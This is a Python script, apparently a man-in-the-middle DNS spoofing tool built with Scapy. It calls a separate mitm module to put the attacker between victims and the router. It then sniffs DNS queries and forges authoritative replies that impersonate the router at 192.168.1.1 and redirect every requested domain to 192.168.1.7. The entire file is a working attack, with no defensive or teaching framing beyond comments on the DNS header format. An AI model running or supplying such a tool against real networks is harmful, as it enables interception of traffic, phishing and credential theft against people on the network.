#!/usr/bin/env python

import mitm

import logging
#logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import subprocess
import signal
import time
import sys
import os

conf.iface = 'eth0'
spoofed_ip = '192.168.1.7'


def send_response(packet):

    # if the sniffed packet is a DNS Query
    if packet[DNS].qr == 0 \
        and packet[DNS].qd.qtype == 1 \
        and packet[DNS].qd.qclass == 1:

        query = packet[DNS].qd.qname

        #print the name of the website that is being queried
        logging.info("Found request for {0}".format(query))

        #Create the IP header, set the src from the router
        #the dest will be the port the query came from
        spoofed_ip_packet = IP(src='192.168.1.1',dst=packet.getlayer(IP).src)

        #Create the UDP header with a source port of 53
        #the dest port will the same port from the query
        spoofed_udp_packet = UDP(sport=53,dport=packet.getlayer(UDP).sport)

        #Here we create the DNS packet based off of the RFC 1035 pages 24-27
        #                                1  1  1  1  1  1
        #  0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
        #|                      ID                       |
        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
        #|QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
        #|                    QDCOUNT                    |
        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
        #|                    ANCOUNT                    |
        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
        #|                    NSCOUNT                    |
        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
        #|                    ARCOUNT                    |
        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

        spoofed_dns_pakcet = DNS(
            id=packet[DNS].id,          #id to match up replies
            qr=1,                       #query or response
            opcode=packet[DNS].opcode,  #the kind of query
            aa=1,                       #specifies that the responding name server is an authority for the domain name
            rd=0,                       #No Recursion Desired
            ra=0,                       #No Recursion Available
            z=0,                        #Reserved for future, must be 0
            rcode=0,                    #Response code - No error condition
            qdcount=packet[DNS].qdcount,#specifying the number of entries
            ancount=1,                  #specifying the number of resource records
            nscount=1,                  #specifying the number of name server resource records
            arcount=1,                  #specifying the number of resource records in the additional records
            qd=DNSQR(qname=query,qtype=packet[DNS].qd.qtype,qclass=packet[DNS].qd.qclass),  #The Question Section
            an=DNSRR(rrname=query,rdata='192.168.1.7',ttl=86400),                           #Resource Record
            ns=DNSRR(rrname=query,type=2,ttl=86400,rdata='192.168.1.7'),                    #Resource Record
            ar=DNSRR(rrname=query,rdata='192.168.1.7'))                                     #Resource Record

        logging.info("Send Response: {0} -> {1}".format(query, spoofed_ip))
        send(spoofed_ip_packet/spoofed_udp_packet/spoofed_dns_pakcet)

    else:
        pass




def main():
    logging.info("Starting...")
    mitm.main()
    sniff(prn=lambda x: send_response(x),
            lfilter=lambda x: x.haslayer(DNS) and x.dport == 53)

if __name__ == "__main__":
    logging.basicConfig(format='%(levelname)s: %(message)s',
            level=logging.DEBUG)
    if os.geteuid() != 0:
        logging.error("[-] You must be root to run this.")
        sys.exit(1)

    def signal_handler(signal, frame):
        mitm.forward_ip(False)
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)

    main()
